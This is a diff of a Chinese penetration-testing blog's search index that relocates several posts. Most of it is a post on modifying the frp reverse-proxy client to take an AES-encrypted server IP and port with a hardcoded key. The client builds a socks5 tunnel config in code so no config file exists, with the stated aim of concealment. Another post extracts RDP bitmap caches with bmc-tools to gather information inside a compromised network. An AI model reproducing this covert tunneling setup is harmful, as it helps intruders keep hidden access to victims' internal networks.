mipsle'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ./release</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> os <span class="keyword">in</span> <span class="variable">$os_all</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">arch</span> <span class="keyword">in</span> <span class="variable">$arch_all</span>; <span class="keyword">do</span></span><br><span class="line">        frp_dir_name=<span class="string">"frp_<span class="variable">${frp_version}</span>_<span class="variable">${os}</span>_<span class="variable">${arch}</span>"</span></span><br><span class="line">        frp_path=<span class="string">"./packages/frp_<span class="variable">${frp_version}</span>_<span class="variable">${os}</span>_<span class="variable">${arch}</span>"</span></span><br><span class="line">        <span class="built_in">cd</span> ..</span><br><span class="line">        <span class="built_in">rm</span> -rf <span class="variable">${frp_path}</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> -</span><br></pre></td></tr></tbody></table></figure>
+<p>编译</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">bash package.sh</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="效果"><a class="header-anchor" href="#效果">¶</a>效果</h2>
+<p><img src="frpc.png" alt="frpc"></p>
+<h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2>
+<blockquote>
+<p><a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">https://uknowsec.cn/posts/notes/FRP改造计划.html</a></p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>frp</tag>
+        <tag>go</tag>
+        <tag>AES</tag>
       </tags>
   </entry>
   <entry>
@@ -613,48 +655,6 @@ Windows 10 Version 1809 for 32-bit Systems</p>
 ]]></content>
       <tags>
         <tag>注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Frp改造 - 参数版+AES加密</title>
-    <url>/2022/01/11/Frp%E6%94%B9%E9%80%A0-%E5%8F%82%E6%95%B0%E7%89%88-AES%E5%8A%A0%E5%AF%86/</url>
-    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
-<p>参数版已经有很多大佬改造过了，因为最近有需求需要把参数加密化，网上没找到现成的，所以手动改造，顺便学一点<code>go</code>语言 😅</p>
-<p>基于<code>uknowsec</code>大佬的文章 <a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">FRP改造计划</a>，实现作者说的：</p>
-<blockquote>
-<p>所以可以直接加一些加密啥的，-t参数传入ip加密后的地址，然后在源码里加一个解密的步骤即可。</p>
-</blockquote>
-<p>另外，个人觉得只加密<code>ip</code>不够隐蔽，所以连同<code>port</code>一起进行<code>AES</code>加密</p>
-<h2 id="改造"><a class="header-anchor" href="#改造">¶</a>改造</h2>
-<p>只需要修改<code>cmd/frpc/sub/root.go</code>即可</p>
-<span id="more"></span>
-<h3 id="1-创建AES函数"><a class="header-anchor" href="#1-创建AES函数">¶</a>1. 创建<code>AES</code>函数</h3>
-<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7Padding</span><span class="params">(ciphertext []<span class="type">byte</span>, blockSize <span class="type">int</span>)</span></span> []<span class="type">byte</span> {</span><br><span class="line">	padding := blockSize - <span class="built_in">len</span>(ciphertext)%blockSize</span><br><span class="line">	padtext := bytes.Repeat([]<span class="type">byte</span>{<span class="type">byte</span>(padding)}, padding)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">append</span>(ciphertext, padtext...)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7UnPadding</span><span class="params">(origData []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> {</span><br><span class="line">	length := <span class="built_in">len</span>(origData)</span><br><span class="line">	unpadding := <span class="type">int</span>(origData[length<span class="number">-1</span>])</span><br><span class="line">	<span class="keyword">return</span> origData[:(length - unpadding)]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesEncrypt</span><span class="params">(origData, key []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) {</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	}</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	origData = PKCS7Padding(origData, blockSize)</span><br><span class="line">	blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])</span><br><span class="line">	crypted := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(origData))</span><br><span class="line">	blockMode.CryptBlocks(crypted, origData)</span><br><span class="line">	<span class="keyword">return</span> crypted, <span class="literal">nil</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesDecrypt</span><span class="params">(crypted, key []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) {</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	}</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])</span><br><span class="line">	origData := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(crypted))</span><br><span class="line">	blockMode.CryptBlocks(origData, crypted)</span><br><span class="line">	origData = PKCS7UnPadding(origData)</span><br><span class="line">	<span class="keyword">return</span> origData, <span class="literal">nil</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<h3 id="2-初始化中定义传参"><a class="header-anchor" href="#2-初始化中定义传参">¶</a>2. 初始化中定义传参</h3>
-<p>只需传一个参数，里面包含<code>ip</code>和<code>port</code>即可</p>
-<figure class="highlight diff"><table><tbody><tr><td class="code"><pre><span class="line">func init() {</span><br><span class="line">	rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, "config", "c", "./frpc.ini", "config file of frpc")</span><br><span class="line">	rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, "version", "v", false, "version of frpc")</span><br><span class="line"><span class="addition">+	rootCmd.PersistentFlags().StringVarP(&amp;ipPort, "ipPort", "t", "", "ip port")</span></span><br><span class="line">	kcpDoneCh = make(chan struct{})</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<h3 id="3-新增函数"><a class="header-anchor" href="#3-新增函数">¶</a>3. 新增函数</h3>
-<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileContent</span><span class="params">(ipPort <span class="type">string</span>)</span></span> {</span><br><span class="line">	AesKey := []<span class="type">byte</span>(<span class="string">"1qaz2wsx3edc4rfv"</span>)  <span class="comment">// 对称秘钥长度必须是16的倍数</span></span><br><span class="line">	encrypted, _ := base64.StdEncoding.DecodeString(ipPort)</span><br><span class="line">	origin, err := AesDecrypt(encrypted, AesKey)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	}</span><br><span class="line">	arr := strings.Fields(<span class="type">string</span>(origin))</span><br><span class="line">	ip := arr[<span class="number">0</span>]</span><br><span class="line">	port := arr[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">var</span> content <span class="type">string</span> = <span class="string">`[common]</span></span><br><span class="line"><span class="string">    server_addr = `</span> + ip + <span class="string">`</span></span><br><span class="line"><span class="string">    server_port = `</span> + port + <span class="string">`</span></span><br><span class="line"><span class="string">	tls_enable = true</span></span><br><span class="line"><span class="string">    token = socks</span></span><br><span class="line"><span class="string">	[socks]</span></span><br><span class="line"><span class="string">	type = tcp</span></span><br><span class="line"><span class="string">	remote_port = 1800</span></span><br><span class="line"><span class="string">	plugin = socks5</span></span><br><span class="line"><span class="string">	`</span></span><br><span class="line">	fileContent = content</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<h3 id="4-修改runClient函数"><a class="header-anchor" href="#4-修改runClient函数">¶</a>4. 修改<code>runClient</code>函数</h3>
-<figure class="highlight diff"><table><tbody><tr><td class="code"><pre><span class="line"><span class="addition">+ func runClient(cfgFilePath string, ipPort string) (err error) {</span></span><br><span class="line">	var content string</span><br><span class="line"><span class="addition">+	getFileContent(ipPort)</span></span><br><span class="line"><span class="addition">+	// content, err = config.GetRenderedConfFromFile(cfgFilePath)</span></span><br><span class="line"><span class="addition">+	content, err = fileContent, nil</span></span><br><span class="line">	if err != nil {</span><br><span class="line">		return</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)</span><br><span class="line">	if err != nil {</span><br><span class="line">		return</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)</span><br><span class="line">	if err != nil {</span><br><span class="line">		return err</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)</span><br><span class="line">	return</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<h3 id="5-调用runClient"><a class="header-anchor" href="#5-调用runClient">¶</a>5. 调用<code>runClient()</code></h3>
-<figure class="highlight diff"><table><tbody><tr><td class="code"><pre><span class="line">var rootCmd = &amp;cobra.Command{</span><br><span class="line">	Use:   "frpc",</span><br><span class="line">	Short: "frpc is the client of frp (https://github.com/fatedier/frp)",</span><br><span class="line">	RunE: func(cmd *cobra.Command, args []string) error {</span><br><span class="line">		if showVersion {</span><br><span class="line">			fmt.Println(version.Full())</span><br><span class="line">			return nil</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		// Do not show command usage here.</span><br><span class="line"><span class="addition">+		err := runClient(cfgFile, ipPort)</span></span><br><span class="line">		if err != nil {</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			os.Exit(1)</span><br><span class="line">		}</span><br><span class="line">		return nil</span><br><span class="line">	},</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<h3 id="6-编译"><a class="header-anchor" href="#6-编译">¶</a>6. 编译</h3>
-<p>修改根目录<code>package.sh</code>，实现直接生成编译文件而不打包</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># compile for version</span></span><br><span class="line">make</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"make error"</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">frp_version=`./bin/frps --version`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"build version: <span class="variable">$frp_version</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cross_compiles</span></span><br><span class="line">make -f ./Makefile.cross-compiles</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf ./release/packages</span><br><span class="line"><span class="built_in">mkdir</span> -p ./release/packages</span><br><span class="line"></span><br><span class="line">os_all=<span class="string">'linux windows darwin freebsd'</span></span><br><span class="line">arch_all=<span class="string">'386 amd64 arm arm64 mips64 mips64le mips mipsle'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ./release</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> os <span class="keyword">in</span> <span class="variable">$os_all</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">arch</span> <span class="keyword">in</span> <span class="variable">$arch_all</span>; <span class="keyword">do</span></span><br><span class="line">        frp_dir_name=<span class="string">"frp_<span class="variable">${frp_version}</span>_<span class="variable">${os}</span>_<span class="variable">${arch}</span>"</span></span><br><span class="line">        frp_path=<span class="string">"./packages/frp_<span class="variable">${frp_version}</span>_<span class="variable">${os}</span>_<span class="variable">${arch}</span>"</span></span><br><span class="line">        <span class="built_in">cd</span> ..</span><br><span class="line">        <span class="built_in">rm</span> -rf <span class="variable">${frp_path}</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> -</span><br></pre></td></tr></tbody></table></figure>
-<p>编译</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">bash package.sh</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="效果"><a class="header-anchor" href="#效果">¶</a>效果</h2>
-<p><img src="frpc.png" alt="frpc"></p>
-<h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2>
-<blockquote>
-<p><a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">https://uknowsec.cn/posts/notes/FRP改造计划.html</a></p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>frp</tag>
-        <tag>go</tag>
-        <tag>AES</tag>
       </tags>
   </entry>
   <entry>
@@ -1066,6 +1066,41 @@ socks5 代理（-D）：相当于 ss/ssr</p>
       </tags>
   </entry>
   <entry>
+    <title>信息收集 - 远程桌面重现</title>
+    <url>/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E9%87%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>常规的信息收集技术就不多讲了，前两天apt32砖家东给我发来一篇文章</p>
+<blockquote>
+<p><a href="https://www.freebuf.com/articles/web/279561.html">https://www.freebuf.com/articles/web/279561.html</a></p>
+</blockquote>
+<p>我一看，牛蛙，rdp远程桌面重现，没想到信息收集还能有这种姿势，属实稀奇，于是试玩了一波</p>
+<h2 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h2>
+<p>文章写的很详细，我就不赘述了，大致原理就是远程桌面会有缓存，解析缓存重现rdp</p>
+<h2 id="复现"><a class="header-anchor" href="#复现">¶</a>复现</h2>
+<p>打开缓存目录<code>C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Cache</code>，看到确实有文件</p>
+<div class="note info"><p>阅读本篇文章能了解到：信息收集，工具利用</p></div>
+<span id="more"></span>
+<p><img src="bmc.png" alt="bmc"></p>
+<p>有大佬写好了工具，直接用工具解析该文件，想知道原理的可以去看原文章</p>
+<blockquote>
+<p><a href="https://github.com/ANSSI-FR/bmc-tools">https://github.com/ANSSI-FR/bmc-tools</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line">bmc-tools.py -s "C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Cache" -d d:\intranet\bmc-tools</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="bmc-tools.png" alt="bmc-tools"><br>
+提取完成，20m文件提取出2553个文件，还是蛮多的，打开看下</p>
+<p><img src="bmc-tools_2.png" alt="bmc-tools_2"></p>
+<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2>
+<p>很新奇的一种信息收集方式，虽然用处不是那么大，但在实在无法收集到信息的时候还是可以尝试一下，属于走投无路的一种奇技淫巧，特此记录</p>
+]]></content>
+      <tags>
+        <tag>奇技淫巧</tag>
+        <tag>笔记</tag>
+        <tag>信息收集</tag>
+        <tag>3389</tag>
+        <tag>远程桌面</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>上传 - 猜测表单参数getshell</title>
     <url>/2019/10/18/%E4%B8%8A%E4%BC%A0-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%8D%95%E5%8F%82%E6%95%B0getshell/</url>
     <content><![CDATA[<h2 id="0x01-前言"><a class="header-anchor" href="#0x01-前言">¶</a>0x01 前言</h2>
@@ -1120,41 +1155,6 @@ socks5 代理（-D）：相当于 ss/ssr</p>
       <tags>
         <tag>上传</tag>
         <tag>getshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息收集 - 远程桌面重现</title>
-    <url>/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E9%87%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
-<p>常规的信息收集技术就不多讲了，前两天apt32砖家东给我发来一篇文章</p>
-<blockquote>
-<p><a href="https://www.freebuf.com/articles/web/279561.html">https://www.freebuf.com/articles/web/279561.html</a></p>
-</blockquote>
-<p>我一看，牛蛙，rdp远程桌面重现，没想到信息收集还能有这种姿势，属实稀奇，于是试玩了一波</p>
-<h2 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h2>
-<p>文章写的很详细，我就不赘述了，大致原理就是远程桌面会有缓存，解析缓存重现rdp</p>
-<h2 id="复现"><a class="header-anchor" href="#复现">¶</a>复现</h2>
-<p>打开缓存目录<code>C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Cache</code>，看到确实有文件</p>
-<div class="note info"><p>阅读本篇文章能了解到：信息收集，工具利用</p></div>
-<span id="more"></span>
-<p><img src="bmc.png" alt="bmc"></p>
-<p>有大佬写好了工具，直接用工具解析该文件，想知道原理的可以去看原文章</p>
-<blockquote>
-<p><a href="https://github.com/ANSSI-FR/bmc-tools">https://github.com/ANSSI-FR/bmc-tools</a></p>
-</blockquote>
-<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line">bmc-tools.py -s "C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Cache" -d d:\intranet\bmc-tools</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="bmc-tools.png" alt="bmc-tools"><br>
-提取完成，20m文件提取出2553个文件，还是蛮多的，打开看下</p>
-<p><img src="bmc-tools_2.png" alt="bmc-tools_2"></p>
-<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2>
-<p>很新奇的一种信息收集方式，虽然用处不是那么大，但在实在无法收集到信息的时候还是可以尝试一下，属于走投无路的一种奇技淫巧，特此记录</p>
-]]></content>
-      <tags>
-        <tag>奇技淫巧</tag>
-        <tag>笔记</tag>
-        <tag>信息收集</tag>
-        <tag>3389</tag>
-        <tag>远程桌面</tag>
       </tags>
   </entry>
   <entry>
